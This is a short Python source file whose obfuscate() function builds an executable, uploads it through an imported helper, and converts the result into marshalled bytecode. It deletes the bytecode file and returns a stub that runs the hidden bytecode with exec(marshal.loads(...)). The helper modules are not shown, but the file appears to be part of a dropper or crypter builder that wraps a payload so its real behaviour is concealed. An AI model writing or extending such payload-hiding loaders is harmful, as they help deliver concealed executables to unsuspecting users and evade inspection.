from create_exe import create_exe
from create_bytecode import create_bytecode
from upload import upload
import os

DEBUG = False

def obfuscate(file_path):
    if not DEBUG:
        exe_path = create_exe(file_path)
    else:
        exe_path = "meow.exe"
    bytecode_path = create_bytecode(upload(exe_path))
    with open(bytecode_path, "rb") as f:
        raw_bytecode = f.read()
    # remove the bytecode file
    os.remove(bytecode_path)
    code = f"""import sys, marshal as m
header_size = 16 if sys.version_info >= (3,7) else 8
exec(m.loads({raw_bytecode}[header_size:]))
"""
    return code
